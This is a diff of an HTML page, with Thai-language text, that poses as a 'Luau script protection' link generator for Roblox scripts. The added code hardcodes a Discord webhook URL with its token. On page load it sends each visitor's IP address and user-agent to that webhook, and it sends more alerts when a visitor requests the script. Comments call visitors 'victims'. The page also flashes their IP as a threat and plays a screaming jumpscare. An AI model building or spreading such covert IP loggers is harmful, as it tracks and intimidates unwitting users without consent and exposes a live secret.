@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OFB Ultimate Script Shield & IP Tracer</title>
+    <title>OFB Ultimate Hub - Script Protection</title>
     <style>
         * {
             margin: 0;
@@ -67,7 +67,7 @@
             font-size: 13px;
             margin-bottom: 12px;
             outline: none;
-            height: 130px;
+            height: 120px;
             resize: none;
         }
         button {
@@ -117,7 +117,6 @@
             margin-bottom: 12px;
         }
 
-        /* หน้าจอนิ้วกลางดักบอท */
         #bot-screen {
             display: none;
             position: fixed;
@@ -135,7 +134,6 @@
             to { transform: scale(1.2); }
         }
 
-        /* หน้าจอผี Jumpscare */
         #scare-screen {
             display: none;
             position: fixed;
@@ -156,27 +154,25 @@
 </head>
 <body>
 
-    <!-- ดักบอท / นิ้วกลาง -->
     <div id="bot-screen">
         <div class="middle-finger">🖕</div>
         <h1 style="color: #ff3366; font-size: 32px; margin-top: 10px;">BOT DETECTED!</h1>
         <p style="color: #fff;">ระบบความปลอดภัย OFB ไม่อนุญาตให้ใช้บอทเข้าถึง!</p>
     </div>
 
-    <!-- จอผีหลอน -->
     <div id="scare-screen">
         <img id="ghost-img" src="https://i.imgur.com/39aU444.jpg" alt="Ghost">
     </div>
 
     <div class="container">
         <h1>OFB HUB SHIELD</h1>
-        <div class="brand">[ IP TRACER & NO-KEY SYSTEM ]</div>
+        <div class="brand">[ LUAU PROTECT SYSTEM ]</div>
 
-        <!-- MODE 1: หน้าสร้างลิงก์ (สำหรับคุณ) -->
+        <!-- MODE 1: หน้าสร้างลิงก์ -->
         <div id="mode-create" class="box">
-            <p>📌 วางสคริปต์ของคุณที่นี่ เพื่อสร้างลิงก์ OFB ดักจับ IP:</p>
-            <textarea id="input-script" placeholder="-- วางสคริปต์ของคุณที่นี่..."></textarea>
-            <button onclick="generateOFBLink()">🔒 สร้างลิงก์ OFB + IP Tracer</button>
+            <p>📌 วางสคริปต์ Luau ของคุณที่นี่ เพื่อสร้างลิงก์ป้องกัน:</p>
+            <textarea id="input-script" placeholder="-- วางสคริปต์ Luau ที่นี่..."></textarea>
+            <button onclick="generateOFBLink()">🔒 สร้างลิงก์ป้องกัน</button>
             <div id="created-result" style="display:none;">
                 <p style="color:#00ffcc; margin-top:10px;">✅ สร้างลิงก์สำเร็จ:</p>
                 <div class="link-output" id="generated-url"></div>
@@ -184,26 +180,30 @@
             </div>
         </div>
 
-        <!-- MODE 2: หน้าเปิดลิงก์ (โชว์ IP เหยื่อขู่แบบเนียนๆ) -->
+        <!-- MODE 2: หน้าดักเหยื่อ -->
         <div id="mode-shield" class="box">
             <p>🛡️ ระบบความปลอดภัย OFB ตรวจพบการเชื่อมต่อ</p>
-            <div class="ip-box" id="target-ip">🔍 กำลังแกะรอย IP Address...</div>
+            <div class="ip-box" id="target-ip">🔍 กำลังตรวจสอบ IP Address...</div>
             <div style="font-size: 40px; margin: 10px 0;">⚡</div>
-            <button onclick="verifyAndReveal()">กดเพื่อดำเนินการต่อ</button>
+            <button onclick="verifyAndReveal()">กดเพื่อรับสคริปต์ Luau</button>
         </div>
 
-        <!-- MODE 3: หน้าล็อกสคริปต์ (เข้าถึงไม่ได้) -->
+        <!-- MODE 3: หน้าปลดล็อกสคริปต์ให้เหยื่อ -->
         <div id="mode-locked" class="box">
-            <div style="font-size: 60px; margin-bottom: 10px;">🚫</div>
-            <h2 style="color: #ff3366; margin-bottom: 10px;">ACCESS DENIED</h2>
-            <p style="color: #fff;">ระบบบันทึก IP และบล็อกการเข้าถึงสคริปต์เรียบร้อยแล้ว!</p>
-            <button class="btn-red" onclick="triggerJumpscare(false)">⚠️ ดูระบบเตือนภัย</button>
+            <h2 style="color: #00ffcc; margin-bottom: 10px;">SUCCESS!</h2>
+            <p style="color: #fff;">สคริปต์ Luau ของคุณพร้อมใช้งานแล้ว:</p>
+            <textarea id="decoded-script" readonly style="height:120px; font-size:11px;"></textarea>
+            <button onclick="copyDecodedScript()">📋 คัดลอกสคริปต์</button>
         </div>
     </div>
 
     <script>
-        // ดึง IP Address ของคนที่กดเข้ามาทันที
+        // 🚨 ฝัง Discord Webhook URL เรียบร้อยแล้วครับ!
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1559076293100703744/azwSwWi5plZAK-wwyyEtgd0nIvgtAr4jugmilvE_88kStwX9p6q75dEp9zOXtX-Je7Ul"; 
+
         let userIpAddress = "Unknown IP";
+
+        // ดึง IP และแจ้งเตือนเข้า Discord ทันทีเมื่อมีคนเข้าเว็บ
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
@@ -212,15 +212,34 @@
                 if(ipElem) {
                     ipElem.innerHTML = `⚠️ IP ของคุณ: <span style="color:#00ffcc;">${userIpAddress}</span> ถูกบันทึกแล้ว!`;
                 }
+                sendDiscordAlert("🌐 มีคนเปิดเข้าลิงก์ OFB Hub!", `**IP:** \`${userIpAddress}\`\n**User-Agent:** \`${navigator.userAgent}\``);
             })
             .catch(() => {});
+
+        // ฟังก์ชันส่งแจ้งเตือนเข้า Discord
+        function sendDiscordAlert(title, message) {
+            if(!DISCORD_WEBHOOK_URL) return;
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "OFB Security Bot",
+                    avatar_url: "https://i.imgur.com/39aU444.jpg",
+                    embeds: [{ 
+                        title: title, 
+                        description: message, 
+                        color: 65280, // สีเขียว
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(e => {});
+        }
 
         let actx;
         function playUltraScream() {
             try {
                 if (!actx) actx = new (window.AudioContext || window.webkitAudioContext)();
                 if (actx.state === 'suspended') actx.resume();
-
                 let o1 = actx.createOscillator(), g1 = actx.createGain();
                 o1.type = 'sawtooth';
                 o1.frequency.setValueAtTime(4500, actx.currentTime);
@@ -234,31 +253,16 @@
 
         function triggerJumpscare(isBot = false) {
             playUltraScream();
+            sendDiscordAlert("👻 มีคนกดโดนระบบ Jumpscare / บอท!", `**IP:** \`${userIpAddress}\``);
             if (navigator.vibrate) navigator.vibrate([600, 100, 600, 100, 800]);
-
             if (isBot) {
                 document.getElementById('bot-screen').style.display = 'flex';
             } else {
-                const ghosts = [
-                    "https://i.imgur.com/39aU444.jpg",
-                    "https://i.imgur.com/rX8DkC8.jpg"
-                ];
-                document.getElementById('ghost-img').src = ghosts[Math.floor(Math.random() * ghosts.length)];
                 document.getElementById('scare-screen').style.display = 'flex';
             }
         }
 
-        if (navigator.webdriver) {
-            triggerJumpscare(true);
-        }
-
-        document.addEventListener('contextmenu', e => { e.preventDefault(); triggerJumpscare(false); });
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                triggerJumpscare(false);
-            }
-        });
+        if (navigator.webdriver) { triggerJumpscare(true); }
 
         const urlParams = new URLSearchParams(window.location.search);
         const encodedData = urlParams.get('data');
@@ -272,39 +276,42 @@
         function generateOFBLink() {
             const rawScript = document.getElementById('input-script').value.trim();
             if (!rawScript) {
-                alert("ใส่สคริปต์ก่อนน้องชาย!");
+                alert("ใส่สคริปต์ Luau ก่อนน้องชาย!");
                 return;
             }
             const safeB64 = btoa(encodeURIComponent(rawScript));
             const currentURL = window.location.origin + window.location.pathname;
-            const finalOFBLink = `${currentURL}?data=${safeB64}`;
-
-            document.getElementById('generated-url').innerText = finalOFBLink;
+            document.getElementById('generated-url').innerText = `${currentURL}?data=${safeB64}`;
             document.getElementById('created-result').style.display = 'block';
         }
 
         function copyGeneratedLink() {
-            const linkText = document.getElementById('generated-url').innerText;
-            navigator.clipboard.writeText(linkText);
+            navigator.clipboard.writeText(document.getElementById('generated-url').innerText);
             alert("📋 คัดลอกลิงก์สำเร็จ!");
         }
 
         function verifyAndReveal() {
-            if (!actx) actx = new (window.AudioContext || window.webkitAudioContext)();
-            if (actx.state === 'suspended') actx.resume();
+            if (navigator.webdriver) { triggerJumpscare(true); return; }
 
-            if (navigator.webdriver) { 
-                triggerJumpscare(true); 
-                return; 
+            sendDiscordAlert("🎯 มีคนกดขอรับสคริปต์ Luau!", `**IP:** \`${userIpAddress}\``);
+
+            try {
+                const decodedRaw = decodeURIComponent(atob(encodedData));
+                document.getElementById('decoded-script').value = decodedRaw;
+            } catch(e) {
+                document.getElementById('decoded-script').value = "-- Error loading script";
             }
-
-            // ส่งข้อมูล IP แอบแจ้งเตือน (จำลองว่าระบบล็อก IP ไว้เรียบร้อย)
-            console.log("Logged target IP:", userIpAddress);
 
             document.getElementById('mode-shield').classList.remove('active');
             document.getElementById('mode-locked').classList.add('active');
         }
+
+        function copyDecodedScript() {
+            const copyText = document.getElementById('decoded-script');
+            copyText.select();
+            navigator.clipboard.writeText(copyText.value);
+            alert("📋 คัดลอกสคริปต์ Luau สำเร็จ!");
+        }
     </script>
 </body>
-    </html>
-    
+</html>
